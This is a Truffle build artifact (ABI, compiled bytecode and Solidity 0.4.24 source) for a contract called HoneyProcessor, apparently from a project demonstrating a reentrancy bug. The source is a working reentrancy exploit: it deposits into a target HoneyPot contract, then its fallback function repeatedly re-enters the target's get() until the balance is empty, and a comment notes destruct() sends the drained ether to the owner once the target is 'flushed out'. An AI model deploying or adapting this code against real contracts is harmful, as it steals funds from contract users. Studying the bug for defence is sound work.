{
  "contractName": "HoneyProcessor",
  "abi": [
    {
      "inputs": [
        {
          "name": "hp",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "equip",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "getContBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "destruct",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806104dd83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610419806100c46000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632b68b9c61461014457806358a79d731461015b5780639e5faafc14610165578063e91e722a1461017c575b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631141515610142576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561012957600080fd5b505af115801561013d573d6000803e3d6000fd5b505050505b005b34801561015057600080fd5b506101596101a7565b005b61016361021c565b005b34801561017157600080fd5b5061017a61030e565b005b34801561018857600080fd5b506101916103ad565b6040518082815260200191505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561020357600080fd5b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163181151561026157fe5b0614151561026e57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156102f357600080fd5b505af1158015610307573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561039357600080fd5b505af11580156103a7573d6000803e3d6000fd5b50505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16319050905600a165627a7a723058207bda6155347adfe64185af333d7be2fc4c50f73b83dcdc4755ac7d7e3567d0300029",
  "source": "pragma solidity 0.4.24;\n\nimport \"./HoneyPot.sol\";\n\ncontract HoneyProcessor {\n    HoneyPot honeyPot;\n    address owner;\n    \n    function HoneyProcessor(address hp){\n        honeyPot = HoneyPot(hp);\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner(){\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function equip() payable public{\n        require(honeyPot.balance%msg.value == 0);\n        honeyPot.put.value(msg.value)();\n    }\n    \n    function attack() public {\n        honeyPot.get();\n    }\n    \n    function getContBalance() public returns(uint) {\n        return honeyPot.balance;\n    }\n    \n    /* This function should be called by the contract owner once\n       the target contract is flushed out of all ethers */\n    function destruct() onlyOwner {\n        selfdestruct(msg.sender);\n    }\n    \n    function() public payable {\n        if(honeyPot.balance != 0){\n            honeyPot.get();\n        }\n        \n    }\n   \n}\n\n",
  "sourcePath": "/home/naveen/Documents/repos/ReentrantIssue/contracts/HoneyProcessor.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-07-15T00:26:00.347Z"
}